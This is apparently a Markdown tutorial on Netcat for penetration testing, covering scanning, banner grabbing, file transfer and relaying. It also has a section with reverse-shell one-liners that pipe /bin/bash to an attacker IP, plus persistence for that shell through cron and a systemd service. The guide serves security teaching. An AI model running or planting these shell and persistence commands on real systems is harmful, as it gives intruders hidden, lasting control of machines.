# Netcat

## **Introduction to Netcat**

Netcat, often referred to as the "Swiss Army knife" of networking tools, is a versatile utility used for reading from and writing to network connections using TCP or UDP protocols. It can be used for a variety of purposes such as port scanning, banner grabbing, file transfers, and even creating reverse shells.

### **Installing Netcat**

Netcat is available on most Unix-like systems and can be installed via package managers. Here are the installation commands for different operating systems:

- **Debian/Ubuntu:**
  ```bash
  sudo apt-get install netcat
  ```

- **Red Hat/CentOS:**
  ```bash
  sudo yum install nc
  ```

- **Windows:**
  Download the binary from the official website or use the built-in version on Windows 10.

### **Basic Usage**

#### **1. Connecting to a Server**

To connect to a remote server on a specific port:

```bash
nc <hostname> <port>
```

Example:
```bash
nc example.com 80
```

This command will open a TCP connection to `example.com` on port 80. You can then manually type HTTP commands to interact with the web server.

#### **2. Listening for Connections**

To make your system listen for incoming connections on a specific port:

```bash
nc -l -p <port>
```

Example:
```bash
nc -l -p 12345
```

This command will make Netcat listen on port 12345 for incoming connections.

### **Port Scanning**

#### **1. Scanning a Single Port**

To scan a single port on a remote host:

```bash
nc -zv <hostname> <port>
```

Example:
```bash
nc -zv example.com 80
```

The `-z` option tells Netcat to scan without sending data, and `-v` enables verbose mode.

#### **2. Scanning a Range of Ports**

To scan a range of ports:

```bash
nc -zv <hostname> <startport>-<endport>
```

Example:
```bash
nc -zv example.com 80-100
```

This command will scan ports 80 to 100 on `example.com`.

### **Banner Grabbing**

Banner grabbing is useful for identifying services running on open ports.

```bash
nc -v <hostname> <port>
```

Example:
```bash
nc -v example.com 80
```

When connected, type any random text and hit enter to receive a response from the server, which often includes a banner.

### **File Transfer**

#### **1. Sending Files**

On the sending machine:

```bash
nc <destination_ip> <port> < <filename>
```

Example:
```bash
nc 192.168.1.2 12345 < file.txt
```

#### **2. Receiving Files**

On the receiving machine:

```bash
nc -l -p <port> > <filename>
```

Example:
```bash
nc -l -p 12345 > received_file.txt
```

### **Creating Reverse Shells**

Reverse shells are a common technique used in penetration testing to gain control over a target machine.

#### **1. On the Attacker's Machine**

Start by listening for incoming connections:

```bash
nc -l -p 4444
```

#### **2. On the Target Machine**

Initiate a reverse shell connection back to the attacker's machine:

```bash
nc <attacker_ip> <port> -e /bin/bash
```

Example:
```bash
nc 192.168.1.2 4444 -e /bin/bash
```

This will provide a shell back to the attacker's machine.

### **Persistent Reverse Shell**

To ensure the reverse shell persists through reboots, you can create a cron job or a systemd service on the target machine.

#### **1. Using Cron Job**

Edit the cron jobs with:

```bash
crontab -e
```

Add the following line:

```bash
@reboot nc <attacker_ip> <port> -e /bin/bash
```

#### **2. Using systemd Service**

Create a new service file in `/etc/systemd/system/reverse-shell.service`:

```ini
[Unit]
Description=Reverse Shell

[Service]
ExecStart=/bin/nc <attacker_ip> <port> -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
```

Enable and start the service:

```bash
sudo systemctl enable reverse-shell.service
sudo systemctl start reverse-shell.service
```

### **Relaying and Proxying**

Netcat can be used to relay traffic between two machines.

#### **1. Relay Traffic**

On the relay machine:

```bash
mkfifo /tmp/fifo
nc -l -p 12345 < /tmp/fifo | nc <destination_ip> 80 > /tmp/fifo
```

This command creates a named pipe and relays traffic from port 12345 to port 80 on the destination IP.

### **Conclusion**

Netcat is a powerful and versatile tool that can be leveraged in various scenarios during penetration testing. Understanding its capabilities and applications is crucial for any penetration tester. Practice these commands in a controlled environment to become proficient in their usage. Always ensure you have proper authorization before performing any penetration testing activities.
